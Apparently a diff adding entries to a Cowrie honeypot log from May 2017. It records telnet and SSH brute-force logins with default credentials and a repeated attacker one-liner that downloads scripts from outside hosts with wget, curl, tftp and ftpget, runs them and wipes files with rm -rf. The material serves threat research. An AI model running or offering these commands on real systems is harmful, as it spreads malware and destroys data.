@@ -3201,3 +3201,162 @@
 2017-05-27T08:29:53+0000 [CowrieTelnetTransport,119060,212.237.27.16] login return, expect: [root/54321]
 2017-05-27T08:29:55+0000 [CowrieTelnetTransport,119060,212.237.27.16] login attempt [sh/cd /tmp; wget http://107.173.209.45/fyfa.sh; curl -O http://107.173.209.45/fyfa.sh; chmod 777 fyfa.sh; sh fyfa.sh; tftp 107.173.209.45 -c get tfyfa.sh; chmod 777 tfyfa.sh; sh tfyfa.sh; tftp -r tfyfa2.sh -g 107.173.209.45; chmod 777 tfyfa2.sh; sh tfyfa2.sh; ftpget -v -u anonymous -p anonymous -P 21 107.173.209.45 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf fyfa.sh tfyfa.sh tfyfa2.sh ftp1.sh; rm -rf *] failed
 2017-05-27T08:29:55+0000 [CowrieTelnetTransport,119060,212.237.27.16] Warning: state changed and new state returned
+2017-05-27T08:30:02+0000 [-] Command found: sh /var/tmp/bin.sh
+2017-05-27T08:30:02+0000 [-] Command found: /bin/busybox tftp -r bin2.sh -l bin2.sh -g 95.215.62.11
+2017-05-27T08:30:02+0000 [-] Command found: tftp -r bin2.sh -l bin2.sh -g 95.215.62.11
+2017-05-27T08:30:02+0000 [-] Command found: sh bin2.sh
+2017-05-27T08:30:02+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://95.215.62.11/bin.sh>
+2017-05-27T08:30:09+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 212.237.27.16:49966 (10.8.41.81:2223) [session: TT119062]
+2017-05-27T08:30:13+0000 [CowrieTelnetTransport,119062,212.237.27.16] login attempt: 333
+2017-05-27T08:30:13+0000 [CowrieTelnetTransport,119062,212.237.27.16] login return, expect: [root/54321]
+2017-05-27T08:30:15+0000 [CowrieTelnetTransport,119062,212.237.27.16] login attempt [admin/meinsm] failed
+2017-05-27T08:30:15+0000 [CowrieTelnetTransport,119062,212.237.27.16] Warning: state changed and new state returned
+2017-05-27T08:30:15+0000 [CowrieTelnetTransport,119062,212.237.27.16] login attempt: 334
+2017-05-27T08:30:15+0000 [CowrieTelnetTransport,119062,212.237.27.16] login return, expect: [root/54321]
+2017-05-27T08:30:17+0000 [CowrieTelnetTransport,119062,212.237.27.16] login attempt [enable/shell] failed
+2017-05-27T08:30:17+0000 [CowrieTelnetTransport,119062,212.237.27.16] Warning: state changed and new state returned
+2017-05-27T08:30:17+0000 [CowrieTelnetTransport,119062,212.237.27.16] login attempt: 335
+2017-05-27T08:30:17+0000 [CowrieTelnetTransport,119062,212.237.27.16] login return, expect: [root/54321]
+2017-05-27T08:30:19+0000 [CowrieTelnetTransport,119062,212.237.27.16] login attempt [sh/cd /tmp; wget http://107.173.209.45/fyfa.sh; curl -O http://107.173.209.45/fyfa.sh; chmod 777 fyfa.sh; sh fyfa.sh; tftp 107.173.209.45 -c get tfyfa.sh; chmod 777 tfyfa.sh; sh tfyfa.sh; tftp -r tfyfa2.sh -g 107.173.209.45; chmod 777 tfyfa2.sh; sh tfyfa2.sh; ftpget -v -u anonymous -p anonymous -P 21 107.173.209.45 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf fyfa.sh tfyfa.sh tfyfa2.sh ftp1.sh; rm -rf *] failed
+2017-05-27T08:30:19+0000 [CowrieTelnetTransport,119062,212.237.27.16] Warning: state changed and new state returned
+2017-05-27T08:30:20+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 200.125.201.207:33993 (10.8.41.81:2222) [session: 3d08cfcc]
+2017-05-27T08:30:20+0000 [HoneyPotSSHTransport,134123,200.125.201.207] Remote SSH version: SSH-2.0-sshlib-0.1
+2017-05-27T08:30:20+0000 [HoneyPotSSHTransport,134123,200.125.201.207] kex alg, key alg: 'diffie-hellman-group1-sha1' 'ssh-dss'
+2017-05-27T08:30:20+0000 [HoneyPotSSHTransport,134123,200.125.201.207] outgoing: 'aes128-cbc' 'hmac-md5' 'none'
+2017-05-27T08:30:20+0000 [HoneyPotSSHTransport,134123,200.125.201.207] incoming: 'aes128-cbc' 'hmac-md5' 'none'
+2017-05-27T08:30:21+0000 [HoneyPotSSHTransport,134123,200.125.201.207] NEW KEYS
+2017-05-27T08:30:21+0000 [HoneyPotSSHTransport,134123,200.125.201.207] starting service 'ssh-userauth'
+2017-05-27T08:30:21+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134123,200.125.201.207] 'root' trying auth 'password'
+2017-05-27T08:30:21+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134123,200.125.201.207] first time for 200.125.201.207, need: 1
+2017-05-27T08:30:21+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134123,200.125.201.207] login attempt: 1
+2017-05-27T08:30:23+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134123,200.125.201.207] login attempt [root/anko] succeeded
+2017-05-27T08:30:25+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134123,200.125.201.207] 'root' authenticated with 'password'
+2017-05-27T08:30:25+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134123,200.125.201.207] starting service 'ssh-connection'
+2017-05-27T08:30:25+0000 [HoneyPotSSHTransport,134123,200.125.201.207] avatar root logging out
+2017-05-27T08:30:25+0000 [HoneyPotSSHTransport,134123,200.125.201.207] connection lost
+2017-05-27T08:30:25+0000 [HoneyPotSSHTransport,134123,200.125.201.207] Connection lost after 5 seconds
+2017-05-27T08:30:25+0000 [CowrieTelnetTransport,119060,212.237.27.16] Connection lost after 47 seconds
+2017-05-27T08:30:26+0000 [CowrieTelnetTransport,119062,212.237.27.16] Connection lost after 16 seconds
+2017-05-27T08:30:26+0000 [CowrieTelnetTransport,119059,212.237.27.16] Connection lost after 64 seconds
+2017-05-27T08:30:26+0000 [CowrieTelnetTransport,119058,212.237.27.16] Connection lost after 69 seconds
+2017-05-27T08:30:26+0000 [CowrieTelnetTransport,119057,212.237.27.16] Closing TTY Log: log/tty/20170527-082927-None-119057i.log after 58 seconds
+2017-05-27T08:30:26+0000 [CowrieTelnetTransport,119057,212.237.27.16] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-05-27T08:30:26+0000 [CowrieTelnetTransport,119057,212.237.27.16] Connection lost after 69 seconds
+2017-05-27T08:30:26+0000 [CowrieTelnetTransport,119061,212.237.27.16] Connection lost after 47 seconds
+2017-05-27T08:30:26+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 195.22.127.83:47283 (10.8.41.81:2222) [session: 5f3fea80]
+2017-05-27T08:30:26+0000 [HoneyPotSSHTransport,134124,195.22.127.83] Remote SSH version: SSH-2.0-sshlib-0.2
+2017-05-27T08:30:26+0000 [HoneyPotSSHTransport,134124,195.22.127.83] kex alg, key alg: 'diffie-hellman-group1-sha1' 'ssh-dss'
+2017-05-27T08:30:26+0000 [HoneyPotSSHTransport,134124,195.22.127.83] outgoing: 'aes128-cbc' 'hmac-md5' 'none'
+2017-05-27T08:30:26+0000 [HoneyPotSSHTransport,134124,195.22.127.83] incoming: 'aes128-cbc' 'hmac-md5' 'none'
+2017-05-27T08:30:26+0000 [HoneyPotSSHTransport,134124,195.22.127.83] NEW KEYS
+2017-05-27T08:30:27+0000 [HoneyPotSSHTransport,134124,195.22.127.83] starting service 'ssh-userauth'
+2017-05-27T08:30:27+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134124,195.22.127.83] 'root' trying auth 'password'
+2017-05-27T08:30:27+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134124,195.22.127.83] login attempt: 22498
+2017-05-27T08:30:27+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134124,195.22.127.83] login return, expect: [support/support]
+2017-05-27T08:30:28+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134124,195.22.127.83] login attempt [root/anko] failed
+2017-05-27T08:30:29+0000 [-] 'root' failed auth 'password'
+2017-05-27T08:30:29+0000 [-] unauthorized login: 
+2017-05-27T08:30:29+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134124,195.22.127.83] 'root' trying auth 'password'
+2017-05-27T08:30:30+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134124,195.22.127.83] login attempt: 22499
+2017-05-27T08:30:30+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134124,195.22.127.83] login return, expect: [support/support]
+2017-05-27T08:30:31+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134124,195.22.127.83] login attempt [root/anko] failed
+2017-05-27T08:30:32+0000 [-] 'root' failed auth 'password'
+2017-05-27T08:30:32+0000 [-] unauthorized login: 
+2017-05-27T08:30:32+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134124,195.22.127.83] 'root' trying auth 'password'
+2017-05-27T08:30:33+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134124,195.22.127.83] login attempt: 22500
+2017-05-27T08:30:33+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134124,195.22.127.83] login return, expect: [support/support]
+2017-05-27T08:30:34+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134124,195.22.127.83] login attempt [root/anko] failed
+2017-05-27T08:30:35+0000 [-] 'root' failed auth 'password'
+2017-05-27T08:30:35+0000 [-] unauthorized login: 
+2017-05-27T08:30:35+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134124,195.22.127.83] 'root' trying auth 'password'
+2017-05-27T08:30:35+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134124,195.22.127.83] login attempt: 22501
+2017-05-27T08:30:35+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134124,195.22.127.83] login return, expect: [support/support]
+2017-05-27T08:30:37+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134124,195.22.127.83] login attempt [root/anko] failed
+2017-05-27T08:30:37+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 212.237.27.16:35646 (10.8.41.81:2223) [session: TT119063]
+2017-05-27T08:30:37+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 212.237.27.16:51601 (10.8.41.81:2223) [session: TT119064]
+2017-05-27T08:30:38+0000 [-] 'root' failed auth 'password'
+2017-05-27T08:30:38+0000 [-] unauthorized login: 
+2017-05-27T08:30:38+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134124,195.22.127.83] 'root' trying auth 'password'
+2017-05-27T08:30:38+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134124,195.22.127.83] login attempt: 22502
+2017-05-27T08:30:38+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134124,195.22.127.83] login return, expect: [support/support]
+2017-05-27T08:30:40+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134124,195.22.127.83] login attempt [root/anko] failed
+2017-05-27T08:30:41+0000 [-] 'root' failed auth 'password'
+2017-05-27T08:30:41+0000 [-] unauthorized login: 
+2017-05-27T08:30:41+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134124,195.22.127.83] 'root' trying auth 'password'
+2017-05-27T08:30:41+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134124,195.22.127.83] login attempt: 22503
+2017-05-27T08:30:41+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134124,195.22.127.83] login return, expect: [support/support]
+2017-05-27T08:30:43+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134124,195.22.127.83] login attempt [root/anko] failed
+2017-05-27T08:30:43+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 212.237.27.16:60209 (10.8.41.81:2223) [session: TT119065]
+2017-05-27T08:30:43+0000 [CowrieTelnetTransport,119064,212.237.27.16] login attempt: 336
+2017-05-27T08:30:43+0000 [CowrieTelnetTransport,119064,212.237.27.16] login return, expect: [root/54321]
+2017-05-27T08:30:44+0000 [CowrieTelnetTransport,119064,212.237.27.16] login attempt [admin/5up] failed
+2017-05-27T08:30:44+0000 [CowrieTelnetTransport,119064,212.237.27.16] Warning: state changed and new state returned
+2017-05-27T08:30:45+0000 [CowrieTelnetTransport,119063,212.237.27.16] login attempt: 337
+2017-05-27T08:30:45+0000 [CowrieTelnetTransport,119063,212.237.27.16] login return, expect: [root/54321]
+2017-05-27T08:30:46+0000 [CowrieTelnetTransport,119063,212.237.27.16] login attempt [root/54321] succeeded
+2017-05-27T08:30:52+0000 [CowrieTelnetTransport,119063,212.237.27.16] Opening TTY Log: log/tty/20170527-083052-None-119063i.log
+2017-05-27T08:30:52+0000 [CowrieTelnetTransport,119063,212.237.27.16] Warning: state changed and new state returned
+2017-05-27T08:30:52+0000 [-] 'root' failed auth 'password'
+2017-05-27T08:30:52+0000 [-] unauthorized login: 
+2017-05-27T08:30:52+0000 [CowrieTelnetTransport,119063,212.237.27.16] CMD: enable
+2017-05-27T08:30:52+0000 [CowrieTelnetTransport,119063,212.237.27.16] Command found: enable 
+2017-05-27T08:30:52+0000 [CowrieTelnetTransport,119063,212.237.27.16] Reading txtcmd from "txtcmds/bin/enable"
+2017-05-27T08:30:52+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134124,195.22.127.83] 'root' trying auth 'password'
+2017-05-27T08:30:52+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134124,195.22.127.83] login attempt: 22504
+2017-05-27T08:30:52+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134124,195.22.127.83] login return, expect: [support/support]
+2017-05-27T08:30:54+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134124,195.22.127.83] login attempt [root/anko] failed
+2017-05-27T08:30:54+0000 [CowrieTelnetTransport,119064,212.237.27.16] login attempt: 338
+2017-05-27T08:30:54+0000 [CowrieTelnetTransport,119064,212.237.27.16] login return, expect: [root/54321]
+2017-05-27T08:30:56+0000 [CowrieTelnetTransport,119064,212.237.27.16] login attempt [enable/shell] failed
+2017-05-27T08:30:56+0000 [CowrieTelnetTransport,119064,212.237.27.16] Warning: state changed and new state returned
+2017-05-27T08:30:56+0000 [CowrieTelnetTransport,119064,212.237.27.16] login attempt: 339
+2017-05-27T08:30:56+0000 [CowrieTelnetTransport,119064,212.237.27.16] login return, expect: [root/54321]
+2017-05-27T08:30:58+0000 [CowrieTelnetTransport,119064,212.237.27.16] login attempt [sh/cd /tmp; wget http://107.173.209.45/fyfa.sh; curl -O http://107.173.209.45/fyfa.sh; chmod 777 fyfa.sh; sh fyfa.sh; tftp 107.173.209.45 -c get tfyfa.sh; chmod 777 tfyfa.sh; sh tfyfa.sh; tftp -r tfyfa2.sh -g 107.173.209.45; chmod 777 tfyfa2.sh; sh tfyfa2.sh; ftpget -v -u anonymous -p anonymous -P 21 107.173.209.45 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf fyfa.sh tfyfa.sh tfyfa2.sh ftp1.sh; rm -rf *] failed
+2017-05-27T08:30:58+0000 [CowrieTelnetTransport,119064,212.237.27.16] Warning: state changed and new state returned
+2017-05-27T08:30:58+0000 [CowrieTelnetTransport,119063,212.237.27.16] CMD: shell
+2017-05-27T08:30:58+0000 [CowrieTelnetTransport,119063,212.237.27.16] Command not found: shell
+2017-05-27T08:30:58+0000 [CowrieTelnetTransport,119063,212.237.27.16] CMD: sh
+2017-05-27T08:30:58+0000 [CowrieTelnetTransport,119063,212.237.27.16] Command found: sh 
+2017-05-27T08:30:58+0000 [CowrieTelnetTransport,119063,212.237.27.16] CMD: cd /tmp; wget http://107.173.209.45/fyfa.sh; curl -O http://107.173.209.45/fyfa.sh; chmod 777 fyfa.sh; sh fyfa.sh; tftp 107.173.209.45 -c get tfyfa.sh; chmod 777 tfyfa.sh; sh tfyfa.sh; tftp -r tfyfa2.sh -g 107.173.209.45; chmod 777 tfyfa2.sh; sh tfyfa2.sh; ftpget -v -u anonymous -p anonymous -P 21 107.173.209.45 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf fyfa.sh tfyfa.sh tfyfa2.sh ftp1.sh; rm -rf *
+2017-05-27T08:30:58+0000 [CowrieTelnetTransport,119063,212.237.27.16] Command found: cd /tmp
+2017-05-27T08:30:58+0000 [CowrieTelnetTransport,119063,212.237.27.16] Command found: wget http://107.173.209.45/fyfa.sh
+2017-05-27T08:30:58+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://107.173.209.45/fyfa.sh>
+2017-05-27T08:30:58+0000 [CowrieTelnetTransport,119063,212.237.27.16] QUEUED INPUT: /bin/busybox ECCHI
+2017-05-27T08:30:58+0000 [-] 'root' failed auth 'password'
+2017-05-27T08:30:58+0000 [-] unauthorized login: 
+2017-05-27T08:30:58+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 212.237.27.16:57056 (10.8.41.81:2223) [session: TT119066]
+2017-05-27T08:30:58+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134124,195.22.127.83] 'root' trying auth 'password'
+2017-05-27T08:30:58+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134124,195.22.127.83] login attempt: 22505
+2017-05-27T08:30:58+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134124,195.22.127.83] login return, expect: [support/support]
+2017-05-27T08:31:00+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,134124,195.22.127.83] login attempt [root/anko] failed
+2017-05-27T08:31:00+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 212.237.27.16:48295 (10.8.41.81:2223) [session: TT119067]
+2017-05-27T08:31:00+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,134033,91.230.47.82] got channel 'direct-tcpip' request
+2017-05-27T08:31:00+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,134033,91.230.47.82] direct-tcp connection request to 185.86.151.225:80 from localhost:5556
+2017-05-27T08:31:00+0000 [SSHChannel None (11) on SSHService 'ssh-connection' on HoneyPotSSHTransport,134033,91.230.47.82] direct-tcp forward to 185.86.151.225:80 with data 'GET /getip.php HTTP/1.1\r\nUser-Agent: Mozilla/5.0\r\nHost: s1.ipinfo.pw\r\nAccept: */*\r\n\r\n'
+2017-05-27T08:31:00+0000 [SSHChannel None (11) on SSHService 'ssh-connection' on HoneyPotSSHTransport,134033,91.230.47.82] failed to connect: Connection refused
+2017-05-27T08:31:00+0000 [SSHChannel None (11) on SSHService 'ssh-connection' on HoneyPotSSHTransport,134033,91.230.47.82] sending close 11
+2017-05-27T08:31:00+0000 [HTTPPageDownloader,client] Not storing duplicate content 6c71445a77d08e648effa0e8b45b4e6fe8827088222dd1f06b58ec50fc28b004
+2017-05-27T08:31:00+0000 [HTTPPageDownloader,client] Downloaded URL (http://107.173.209.45/fyfa.sh) with SHA-256 6c71445a77d08e648effa0e8b45b4e6fe8827088222dd1f06b58ec50fc28b004 to dl/6c71445a77d08e648effa0e8b45b4e6fe8827088222dd1f06b58ec50fc28b004
+2017-05-27T08:31:00+0000 [HTTPPageDownloader,client] Command found: curl -O http://107.173.209.45/fyfa.sh
+2017-05-27T08:31:00+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://107.173.209.45/fyfa.sh>
+2017-05-27T08:31:00+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://107.173.209.45/fyfa.sh>
+2017-05-27T08:31:00+0000 [HTTPPageDownloader,client] Not storing duplicate content 6c71445a77d08e648effa0e8b45b4e6fe8827088222dd1f06b58ec50fc28b004
+2017-05-27T08:31:00+0000 [HTTPPageDownloader,client] Downloaded URL (http://107.173.209.45/fyfa.sh) with SHA-256 6c71445a77d08e648effa0e8b45b4e6fe8827088222dd1f06b58ec50fc28b004 to dl/6c71445a77d08e648effa0e8b45b4e6fe8827088222dd1f06b58ec50fc28b004
+2017-05-27T08:31:00+0000 [HTTPPageDownloader,client] Command found: chmod 777 /tmp/fyfa.sh
+2017-05-27T08:31:00+0000 [HTTPPageDownloader,client] Command found: sh /tmp/fyfa.sh
+2017-05-27T08:31:00+0000 [HTTPPageDownloader,client] Command found: tftp 107.173.209.45 -c get tfyfa.sh
+2017-05-27T08:31:00+0000 [HTTPPageDownloader,client] Command found: chmod 777 tfyfa.sh
+2017-05-27T08:31:00+0000 [HTTPPageDownloader,client] Command found: sh tfyfa.sh
+2017-05-27T08:31:00+0000 [HTTPPageDownloader,client] Command found: tftp -r tfyfa2.sh -g 107.173.209.45
+2017-05-27T08:31:00+0000 [HTTPPageDownloader,client] Command found: chmod 777 tfyfa2.sh
+2017-05-27T08:31:00+0000 [HTTPPageDownloader,client] Command found: sh tfyfa2.sh
+2017-05-27T08:31:00+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 107.173.209.45 ftp1.sh ftp1.sh
+2017-05-27T08:31:00+0000 [HTTPPageDownloader,client] FTP connect failed: host=107.173.209.45, port=21, err=[Errno 111] Connection refused
+2017-05-27T08:31:00+0000 [HTTPPageDownloader,client] Command found: sh ftp1.sh
+2017-05-27T08:31:00+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/fyfa.sh tfyfa.sh tfyfa2.sh ftp1.sh
+2017-05-27T08:31:00+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/.X11-unix /tmp/.ICE-unix
+2017-05-27T08:31:00+0000 [HTTPPageDownloader,client] Command found: /bin/busybox ECCHI
+2017-05-27T08:31:00+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://107.173.209.45/fyfa.sh>
+2017-05-27T08:31:01+0000 [CowrieTelnetTransport,119065,212.237.27.16] login attempt: 340
+2017-05-27T08:31:01+0000 [CowrieTelnetTransport,119065,212.237.27.16] login return, expect: [root/54321]
